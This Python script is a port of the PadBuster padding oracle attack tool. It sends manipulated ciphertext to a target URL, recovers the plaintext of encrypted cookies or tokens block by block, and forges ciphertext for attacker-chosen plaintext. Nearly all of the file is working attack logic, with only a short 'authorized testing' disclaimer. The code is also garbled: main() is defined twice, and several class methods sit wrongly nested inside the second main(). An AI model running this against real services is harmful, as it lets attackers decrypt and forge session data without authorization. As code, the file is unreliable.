# This script is a port of the 'PadBuster v0.3.3'PadBuster
# an automated script for performing Padding Oracle attacks original written by
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
#
# As with the og, credits to J.Rizzo and T.Duong for providing proof of concept web
# exploit techniques and S.Vaudenay for initial discovery of the attack. Credits also
# to James M. Martin (research@esptl.com) for sharing proof of concept exploit
# code for performing various brute force attack techniques, and wireghoul (Eldar 
# Marcussen) for making code quality improvements.


"""
PadBuster-like Python script with expanded block-by-block padding oracle logic
and 'encrypt mode' (forging ciphertext).
-----------------------------------------------------------------------------

This script attempts to replicate the Perl "PadBuster" approach in Python,
especially focusing both on the 'processBlock' routine that does the actual
block-by-block, byte-by-byte attack, and, deriving the "intermediary" bytes
for an existing ciphertext block (via padding oracle) then using those
intermediary bytes to XOR with your custom plaintext block, yielding a new
valid block.

Important: This is for demonstration and authorized testing only - Use responsibly.
"""

import sys
import math
import os
import argparse
import requests
import urllib.parse
import base64
import time
from collections import defaultdict

def main():
    parser = argparse.ArgumentParser(description="PadBuster-like script in Python (expanded block logic)")
    parser.add_argument("--url", required=True, help="Target URL containing the ciphertext")
    parser.add_argument("--encrypted-sample", required=True, help="Encrypted sample that also appears in the request")
    parser.add_argument("--block-size", type=int, required=True, help="Block size used by the cipher (e.g., 16 for AES)")
    parser.add_argument("--error", help="Padding error string to detect the oracle (optional)")
    parser.add_argument("--encoding", type=int, default=0,
                        help="Encoding format: 0=Base64, 1=HexLower, 2=HexUpper, 3=.NET UrlToken, 4=WebSafe Base64")
    parser.add_argument("--verbose", action="store_true", help="Be verbose about requests")
    parser.add_argument("--log", action="store_true", help="Write logs to files (PadBuster_date/ subdir)")
    parser.add_argument("--no-iv", action="store_true", help="Indicate no IV was included in the sample (use zero block?)")
    parser.add_argument("--no-encode", action="store_true", help="Do not URI-encode the manipulated ciphertext")
    # For brevity, we skip many optional params from the Perl script
    args = parser.parse_args()

    padbuster = PadBuster(
        url=args.url,
        encrypted_sample=args.encrypted_sample,
        block_size=args.block_size,
        error_string=args.error,
        encoding_format=args.encoding,
        verbose=args.verbose,
        log_files=args.log,
        no_iv=args.no_iv,
        no_encode_option=args.no_encode,
    )
    padbuster.run()


print ("+-------------------------------------------+")
print ("| PadBuster - vP0.0.1                       |")
print ("| Port from Perl to Python by whisprer      |")
print ("| github.com/whisprer/PadBuster             |")
print ("+-------------------------------------------+")


class PadBuster:
    """
    A Python re-implementation of the core PadBuster logic:
    1. Splitting ciphertext into blocks
    2. Decrypting block-by-block with a padding oracle
    """

    def __init__(
        self,
        url: str,
        encrypted_sample: str,
        block_size: int,
        error_string: str = None,
        encoding_format: int = 0,
        verbose: bool = False,
        log_files: bool = False,
        no_iv: bool = False,
        no_encode_option: bool = False,
    ):
        self.url = url
        self.sample = encrypted_sample
        self.block_size = block_size
        self.error_string = error_string
        self.encoding_format = encoding_format
        self.verbose = verbose
        self.log_files = log_files
        self.no_iv = no_iv
        self.no_encode_option = no_encode_option

        # Will store the fully decoded ciphertext as bytes
        self.raw_cipher_bytes = b""

        # For analyzing potential oracle signatures if error_string is empty
        self.oracle_signature = None
        self.analysis_responses = defaultdict(int)  # For storing result patterns
        self.analysis_buffers = {}
        self.request_count = 0

        # Pre-flight decode
        self.decode_sample()

    def decode_sample(self):
        """
        1. URI unescape if it looks like it's encoded (presence of %).
        2. Decode from the given format (Base64, hex, etc.).
        3. If no_iv is set, we artificially prepend a block of null bytes.
        """
        tmp = self.sample
        if '%' in tmp or '+' in tmp:  # Possibly URL-encoded
            tmp = urllib.parse.unquote(tmp)

        # Format decode
        self.raw_cipher_bytes = self.my_decode(tmp.encode('ascii'), self.encoding_format)

        if (len(self.raw_cipher_bytes) % self.block_size) != 0:
            print(f"[!] ERROR: Encrypted Bytes must be multiple of blockSize={self.block_size}.")
            print(f"    We got length={len(self.raw_cipher_bytes)}. Check your encoding or block size.")
            sys.exit(1)

        if self.no_iv:
            # In the original script, if there's no IV, they artificially add zero block at the front
            # for the purpose of decrypting the first block as if it had an IV
            self.raw_cipher_bytes = (b"\x00" * self.block_size) + self.raw_cipher_bytes


    def my_encode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'encode', fmt)

    def my_decode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'decode', fmt)

    def encode_decode(self, data: bytes, operation: str, fmt: int) -> bytes:
        """
        0=Base64, 1=HexLower, 2=HexUpper, 3=.NET UrlToken, 4=WebSafe Base64
        """
        if operation == 'decode':
            if fmt == 1 or fmt == 2:
                # hex
                hex_str = data.decode('ascii').lower()  # ignoring upper-lower differences
                return bytes.fromhex(hex_str)
            elif fmt == 3:
                return self.web64_decode(data.decode('ascii'), net=True)
            elif fmt == 4:
                return self.web64_decode(data.decode('ascii'), net=False)
            else:
                # 0 => base64
                return base64.b64decode(data)
        else:
            # encode
            if fmt == 1 or fmt == 2:
                # hex
                hex_str = data.hex()
                if fmt == 2:
                    hex_str = hex_str.upper()
                return hex_str.encode('ascii')
            elif fmt == 3:
                return self.web64_encode(data, net=True)
            elif fmt == 4:
                return self.web64_encode(data, net=False)
            else:
                # base64
                return base64.b64encode(data).replace(b"\n", b"")

    def web64_encode(self, raw_data: bytes, net: bool) -> bytes:
        b64 = base64.b64encode(raw_data).decode('ascii')
        b64 = b64.replace('+', '-').replace('/', '_')
        eq_count = b64.count('=')
        b64 = b64.replace('=', '')
        if net:
            b64 += str(eq_count)
        return b64.encode('ascii')

    def web64_decode(self, enc_str: str, net: bool) -> bytes:
        tmp = enc_str.replace('-', '+').replace('_', '/')
        if net:
            eq_count = tmp[-1]
            tmp = tmp[:-1]
            tmp += '=' * int(eq_count)
        return base64.b64decode(tmp)


# -------------------------------
    # Oracle Query / Check
    # -------------------------------
    def make_request(self, test_url: str) -> tuple:
        """
        Minimal GET request that replaces the sample in the URL with our manipulated ciphertext.
        You could expand to POST, cookies, etc.
        """
        self.request_count += 1
        try:
            resp = requests.get(test_url, allow_redirects=False, timeout=10)
            status_code = resp.status_code
            content = resp.text
            loc = resp.headers.get("Location", "N/A")
            c_len = len(content)
            return (status_code, content, loc, c_len)
        except Exception as e:
            print(f"[!] Request error: {e}")
            return (0, "", "N/A", 0)

    def is_successful(self, status_code, content, location, content_length) -> bool:
        """
        Return True if not a padding error.
        We either check the error_string or compare with oracle signature.
        """
        if self.error_string:
            if self.error_string in content:
                return False
            return True
        elif self.oracle_signature:
            sig = self.build_signature(status_code, content_length, location, content)
            if sig == self.oracle_signature:
                return False
            return True
        else:
            # analysis mode
            return False

    def build_signature(self, status, content_length, location, content):
        # The simpler approach: we do not incorporate the entire body, unless the user wants to
        return f"{status}\t{content_length}\t{location}"


    # -------------------------------
    # Decryption Mode (Skeleton)
    # -------------------------------
    def decrypt_mode(self):
        """
        A partial or skeleton approach for block-by-block decryption,
        not the focus of this snippet. 
        """
        pass

    # -------------------------------------------------------
    # The "processBlock" used in both decrypt and encrypt
    # to discover Intermediary Bytes
    # -------------------------------------------------------
    def process_block(self, target_block: bytes) -> bytes:
        """
        Derive 'intermediary bytes' for target_block by using a fake block 
        and the padding oracle logic. 
        """
        block_size = self.block_size
        fake_block = bytearray(block_size)
        intermediary = bytearray(block_size)

        # If we haven't done analysis mode, we might do it here (omitted for brevity).
        # We'll just show direct approach with known error/ oracle_signature.

        for byte_pos in reversed(range(block_size)):
            pad_val = block_size - byte_pos
            found_correct = False
            for guess in range(256):
                fake_block[byte_pos] = guess

                # Adjust the known discovered bytes so they remain valid for the new pad
                for k in range(byte_pos+1, block_size):
                    fake_block[k] = intermediary[k] ^ pad_val

                combined = bytes(fake_block) + target_block
                combined_encoded = self.my_encode(combined, self.encoding_format)
                if not self.no_encode_option:
                    combined_encoded = urllib.parse.quote(combined_encoded.decode('ascii'), safe='').encode('ascii')

                # Replace the sample in the URL
                test_url = self.url.replace(self.sample, combined_encoded.decode('ascii'), 1)

                status, content, loc, c_len = self.make_request(test_url)

                if self.is_successful(status, content, loc, c_len):
                    # found the correct guess
                    intermediary_val = guess ^ pad_val
                    intermediary[byte_pos] = intermediary_val
                    found_correct = True
                    if self.verbose:
                        print(f"    [BlockByte {byte_pos}] guess={guess}, Intermediary={intermediary_val}")
                    break

            if not found_correct:
                print(f"[!] Byte {byte_pos} not found. Possibly error_string mismatch or ambiguous.")
                # continue with zero or do interactive steps.

        return bytes(intermediary)


    # -------------------------------------------------------
    # ENCRYPT MODE
    # -------------------------------------------------------
    def encrypt_mode(self, plaintext: bytes):
        """
        Reverse the padding oracle to produce a forged ciphertext for 'plaintext'.
        
        Approach from original Perl:
          1. We do PKCS#7 pad on plaintext to make it multiple of block_size.
          2. We start from the last block (plaintext block_count down to 1).
             - For each block, we discover the 'intermediary' for a known 
               or user-provided 'cipher' block. If none is provided, 
               we might use 0 block for the last block.
             - Then we XOR that 'intermediary' with the plaintext block 
               to get the new ciphertext block.
          3. Prepend that new block to the front (for each iteration).
        """
        block_size = self.block_size
        # Pad the plaintext
        pad_len = block_size - (len(plaintext) % block_size)
        if pad_len == 0:
            pad_len = block_size
        padded = plaintext + bytes([pad_len]) * pad_len

        # Number of blocks needed for padded plaintext
        block_count = math.ceil(len(padded) / block_size)
        print(f"[+] Plaintext length {len(plaintext)}, padded to {len(padded)} => {block_count} blocks.")

        # The final forged ciphertext we build from right to left
        forged_cipher = b""

        # For demonstration, we let the user provide an initial block 
        # or we assume a zero block. We’ll do a "fake" block all zero if you want:
        # In some workflows, you might let the user specify something 
        # like --ciphertext=.... to start from a known block. 
        current_cipher_block = b"\x00" * block_size

        # We iterate from the last plaintext block to the first
        # (the original script goes in descending order).
        for block_index in range(block_count, 0, -1):
            print(f"[***] Generating block {block_index} of {block_count}")
            # Extract the block of plaintext we want to encrypt
            start_pos = (block_index - 1) * block_size
            end_pos = block_index * block_size
            current_plain_block = padded[start_pos:end_pos]

            # If the user provides a "cipherInput" from the original code, 
            # we might use that for the final block. 
            # Otherwise we do the approach of discovering the intermediary 
            # for the "current_cipher_block" by calling process_block.
            print(f"    Deriving Intermediary for blockIndex={block_index}...")

            # Step 1: discover intermediary for the block we have 
            # (the code calls it `sampleBytes` in the Perl).
            # If we haven't discovered it before, let's do it:
            # We treat `current_cipher_block` as the "target_block" we pass to process_block.
            intermediary_bytes = self.process_block(current_cipher_block)

            # Step 2: XOR the discovered intermediary with the plaintext block 
            # to get the new ciphertext block
            new_cipher_block = bytes(a ^ b for (a, b) in zip(intermediary_bytes, current_plain_block))

            # We then *prepend* that new block to the forged_cipher
            forged_cipher = new_cipher_block + forged_cipher

            print(f"    [Block {block_index}] newCipherBlock (HEX) = {self.my_encode(new_cipher_block, 2).decode('ascii')}")

            # The newly created block is the "next" block we want to produce. 
            # But for the next iteration, we set current_cipher_block to the new block’s “intermediary” or something?
            # In the original, each time we shift.
            # Actually, we now set 'current_cipher_block = new_cipher_block' 
            # so that the next block we produce is discovered from the next iteration. 
            current_cipher_block = new_cipher_block

        # Return the final forged ciphertext as an encoded string
        final_enc = self.my_encode(forged_cipher, self.encoding_format)
        # Possibly URL-escape if needed
        if not self.no_encode_option:
            final_enc = urllib.parse.quote(final_enc.decode('ascii'), safe='').encode('ascii')

        return final_enc

def main():
    parser = argparse.ArgumentParser(description="PadBuster-like script in Python with encryption forging mode.")
    parser.add_argument("--url", required=True, help="Target URL containing the ciphertext")
    parser.add_argument("--encrypted-sample", required=True, help="Encrypted sample that also appears in the request")
    parser.add_argument("--block-size", type=int, required=True, help="Block size (e.g. 16 for AES)")
    parser.add_argument("--error", help="Padding error string if known")
    parser.add_argument("--encoding", type=int, default=0, help="0=Base64,1=HexLower,2=HexUpper,3=.NET UrlToken,4=WebSafe B64")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--log", action="store_true", help="Enable file logging (not fully implemented here)")
    parser.add_argument("--no-iv", action="store_true", help="Sample does not contain IV (prepend zeros).")
    parser.add_argument("--no-encode", action="store_true", help="Do not URL-encode the manipulated ciphertext.")
    parser.add_argument("--plaintext", help="The plaintext you want to encrypt/forge.")
    args = parser.parse_args()

    padbuster = PadBuster(
        url=args.url,
        encrypted_sample=args.encrypted_sample,
        block_size=args.block_size,
        error_string=args.error,
        encoding_format=args.encoding,
        verbose=args.verbose,
        log_files=args.log,
        no_iv=args.no_iv,
        no_encode_option=args.no_encode
    )

    if args.plaintext:
        # ENCRYPT MODE
        plaintext_bytes = args.plaintext.encode('ascii')  # or handle other enc
        print("[+] Starting 'Encrypt Mode' via padding oracle forging.")
        forged = padbuster.encrypt_mode(plaintext_bytes)
        print(f"[=] Final Forged Cipher: {forged.decode('ascii')}")
    else:
        # DECRYPT MODE (not fully shown)
        print("[+] No --plaintext was provided, so we'd do normal decrypt scenario...")
        # padbuster.decrypt_mode()
        pass


    def run(self):
        """
        The main "Decrypt Mode" flow, akin to the Perl code when not in brute force or encrypt mode.
        """
        total_length = len(self.raw_cipher_bytes)
        # The block_count includes the artificially added block if no_iv is set
        block_count = total_length // self.block_size

        # If we only have 1 block, there's nothing to decrypt
        if block_count < 2:
            print("[!] ERROR: Not enough blocks for a standard decrypt. Possibly use --no-iv if you haven't.")
            sys.exit(1)

        print("[+] Starting Decrypt Mode (Python)")

        # The first block is the IV (which might be real or might be zero-block).
        # In the original code, the Perl script loops from block 2..block_count
        # because block 1 is considered the IV. So let's do that:

        # We'll store the plaintext result in `decrypted_full`
        decrypted_full = b""

        # A quick test request, akin to the original script
        self.test_original_request()

        # The main loop
        # Because block 0 is the IV, we effectively want to decrypt blocks 1..(block_count-1)
        # referencing the block behind them as the "fake block".
        for block_idx in range(1, block_count):
            # block_idx is the index of the ciphertext block we want to decrypt
            print(f"\n[***] Decrypting Block {block_idx} of {block_count-1}")

            # sample_bytes is the actual ciphertext block we want to figure out
            sample_bytes = self.raw_cipher_bytes[block_idx * self.block_size : (block_idx + 1) * self.block_size]

            # We'll call process_block to do the heavy lifting
            intermediary = self.process_block(sample_bytes)

            # We now produce the actual plaintext by XORing the intermediary bytes
            # with the previous block's ciphertext (or the IV if block_idx == 1).
            # If block_idx == 1, we XOR with raw_cipher_bytes[0..block_size], which is the IV.
            prev_block = self.raw_cipher_bytes[(block_idx - 1) * self.block_size : block_idx * self.block_size]

            decrypted_block = bytes(a ^ b for (a, b) in zip(intermediary, prev_block))

            print(f"[+] Decrypted Block (HEX): {self.my_encode(decrypted_block, 2).decode('ascii')}")
            print(f"[+] Decrypted Block (ASCII): {self.pretty_print(decrypted_block)}")

            # We accumulate
            decrypted_full += decrypted_block

        # Print final results
        print("\n[+] Completed all blocks!")
        print(f"[+] Full Decrypted Value (HEX): {self.my_encode(decrypted_full, 2).decode('ascii')}")
        print(f"[+] Full Decrypted Value (Base64): {self.my_encode(decrypted_full, 0).decode('ascii')}")
        print(f"[+] Full Decrypted Value (ASCII): {self.pretty_print(decrypted_full)}")

    def process_block(self, sample_block: bytes) -> bytes:
        """
        This method tries to discover the 'intermediary' bytes for the given block by
        building a "fake block" and modifying each byte from right to left until the
        correct padding passes the oracle.

        This is a direct counterpart to the large subroutine in the Perl script that
        does for($byteNum = blockSize-1..0) and tries i=255..0, etc.
        """
        # We'll maintain a local "fake block" of size block_size, initially all 0x00
        fake_block = bytearray(self.block_size)

        # We will store the discovered "intermediary" bytes here, from right to left.
        # Initially all 0
        intermediary_bytes = bytearray(self.block_size)

        # We'll track if we needed to do "analysis mode" to guess the oracle signature
        analysis_mode = False
        if not self.error_string and not self.oracle_signature:
            analysis_mode = True
            print("[-] We have no known error string and no oracle signature. We'll gather data first...")

        # The idea is: We move from the last byte to the first.
        for current_byte_pos in reversed(range(self.block_size)):
            # We'll do up to 256 attempts for that byte
            found = False
            # The desired pad value
            pad_val = self.block_size - current_byte_pos

            for i in range(256):
                # Build the test block: we set the current byte to i
                fake_block[current_byte_pos] = i

                # If we have already discovered some bytes, we fix them so they remain correct
                # by applying the known intermediary XOR pad
                for k in range(current_byte_pos + 1, self.block_size):
                    # example: new_val = (intermediary_bytes[k] ^ pad_val)
                    # see the original logic
                    fake_block[k] = intermediary_bytes[k] ^ pad_val

                # Combine test bytes + sample_block
                combined = bytes(fake_block) + sample_block

                # Possibly do prefix/no-encode, etc. For brevity, we’ll do the minimal approach:
                combined_encoded = self.my_encode(combined, self.encoding_format)
                if not self.no_encode_option:
                    combined_encoded = urllib.parse.quote(combined_encoded.decode('ascii'), safe='').encode('ascii')

                # Now build the request that replaces the sample
                test_url = self.url.replace(self.sample, combined_encoded.decode('ascii'), 1)

                # Make the request
                status, content, loc, c_len = self.make_request(test_url)

                # If we haven't determined an oracle signature yet (analysis mode):
                if analysis_mode:
                    sig_data = self.build_signature(status, c_len, loc, content)
                    self.analysis_responses[sig_data] += 1
                    if i == 0 and current_byte_pos == self.block_size - 1:
                        # Done collecting for the entire range 0..255 on last byte
                        # We can pick the signature that is *least common* or the one the user picks
                        # The original script tries to parse user input. We'll do a quick guess:
                        self.determine_oracle_signature()
                        analysis_mode = False
                        # Then we must re-try the block from scratch
                        return self.process_block(sample_block)
                else:
                    # We compare to see if it's a "success" or "failure"
                    if self.is_successful(status, content, loc, c_len):
                        # Found correct byte
                        # The intermediary byte is i ^ pad_val
                        intermediary_val = i ^ pad_val
                        intermediary_bytes[current_byte_pos] = intermediary_val
                        # Move on to the next byte
                        found = True
                        if self.verbose:
                            print(f"    Byte {current_byte_pos}: Found = {i}, Intermediary={intermediary_val}")
                        break

            if not found:
                print(f"[!] WARNING: Could not find a correct byte for position {current_byte_pos}")
                print("    Possibly the error string is not correct, or the oracle signature is ambiguous.")
                # You might do some interactive logic here (like the original script).
                # We'll just soldier on with zero.
                intermediary_bytes[current_byte_pos] = 0

        return bytes(intermediary_bytes)

    def is_successful(self, status_code, content, location, content_length) -> bool:
        """
        Check if the request *did not* produce the padding error.
        We either look for the 'error_string' in content or we compare
        to the known oracle signature (i.e. if it differs from the 'error').
        """
        # If we have a known error string:
        if self.error_string:
            if self.error_string in content:
                return False
            return True
        elif self.oracle_signature:
            # Compare signature data
            sig_data = self.build_signature(status_code, content_length, location, content)
            if sig_data == self.oracle_signature:
                return False
            return True
        else:
            # We are in analysis mode or haven't determined anything yet
            # We'll store the data in self.analysis_responses for analysis
            return False

    def build_signature(self, status, content_length, location, content):
        """
        Build a simple string that identifies a "response signature."
        This is basically what the original Perl code does:
            my $signatureData = "$status\t$contentLength\t$location\t$content" if useBody else ...
        For brevity, we’ll always assume we do not use the full body. Could add a toggle if needed.
        """
        # For demonstration, let's omit the body. The original code has a 'usebody' option.
        return f"{status}\t{content_length}\t{location}"

    def determine_oracle_signature(self):
        """
        In the original code, it tries to guess which signature is the "error."
        It’s basically the one that appears the most (or least) times among 256 attempts.
        Typically, the "error" is the signature that occurs the majority of the time.
        But you might want user input. We'll pick the most frequent one as "error" or "oracleSignature."
        """
        # We sort by the frequency
        sorted_guesses = sorted(self.analysis_responses.items(), key=lambda x: x[1], reverse=True)

        if len(sorted_guesses) <= 1:
            print("[-] Could not do meaningful analysis; all responses are identical or none recorded.")
            self.oracle_signature = None
            return

        # The top guess is the most frequent
        top_signature, count = sorted_guesses[0]
        print(f"[Analysis] Found the most frequent signature (likely the error) => {repr(top_signature)} (Count {count})")
        self.oracle_signature = top_signature

    def test_original_request(self):
        """
        Just like in the Perl script, let's do a single request with the original sample
        so the user sees how it responds.
        """
        status, content, loc, c_len = self.make_request(self.url)
        print(f"[Test Original Request] => Status: {status}, Content-Length: {c_len}, Location: {loc}")

    def make_request(self, test_url: str, method='GET'):
        """
        A simplified version of 'makeRequest' from the Perl script.
        We only handle GET for demonstration. 
        If you have POST data, you can adapt accordingly.
        """
        self.request_count += 1
        try:
            resp = requests.get(test_url, allow_redirects=False, timeout=10)
            status_code = resp.status_code
            content = resp.text
            loc = resp.headers.get("Location", "N/A")
            c_len = len(content)
            return (status_code, content, loc, c_len)
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            return (0, "", "N/A", 0)

    # ----------------------------------------------------------------
    # The following are small encode/decode helpers
    # ----------------------------------------------------------------

    def my_encode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'encode', fmt)

    def my_decode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'decode', fmt)

    def encode_decode(self, data: bytes, operation: str, fmt: int) -> bytes:
        """
        Replicates the old 'encodeDecode' logic with:
          0=Base64, 1=HexLower, 2=HexUpper, 3=.NET UrlToken, 4=WebSafe Base64
        """
        if operation == 'decode':
            if fmt in [1, 2]:
                # hex
                # for decode, ignoring upper/lower differences
                hex_str = data.decode('ascii').lower()
                return bytes.fromhex(hex_str)
            elif fmt == 3:
                # .NET UrlToken
                return self.web64_decode(data.decode('ascii'), net=True)
            elif fmt == 4:
                # WebSafe
                return self.web64_decode(data.decode('ascii'), net=False)
            else:
                # Base64
                return base64.b64decode(data)
        else:
            # encode
            if fmt in [1, 2]:
                # hex
                hex_str = data.hex()
                if fmt == 2:
                    hex_str = hex_str.upper()
                return hex_str.encode('ascii')
            elif fmt == 3:
                # .NET UrlToken
                return self.web64_encode(data, net=True)
            elif fmt == 4:
                # WebSafe
                return self.web64_encode(data, net=False)
            else:
                # Base64
                enc = base64.b64encode(data)
                return enc.replace(b"\n", b"")

    def web64_encode(self, raw_data: bytes, net: bool) -> bytes:
        """
        net=False => Web64 style
        net=True => .NET UrlToken style (the script appends the # of '=' as digit).
        """
        b64 = base64.b64encode(raw_data).decode('ascii')
        # replace +/ with -_
        b64 = b64.replace('+', '-').replace('/', '_')
        # strip '='
        eq_count = b64.count('=')
        b64 = b64.replace('=', '')
        if net:
            b64 += str(eq_count)
        return b64.encode('ascii')

    def web64_decode(self, enc_str: str, net: bool) -> bytes:
        tmp = enc_str.replace('-', '+').replace('_', '/')
        if net:
            eq_count = tmp[-1]
            tmp = tmp[:-1]
            tmp += '=' * int(eq_count)
        return base64.b64decode(tmp)

    @staticmethod
    def pretty_print(data: bytes) -> str:
        """Just a convenient ASCII-limited print."""
        try:
            return data.decode('ascii', errors='replace')
        except:
            return repr(data)


if __name__ == "__main__":
    main()
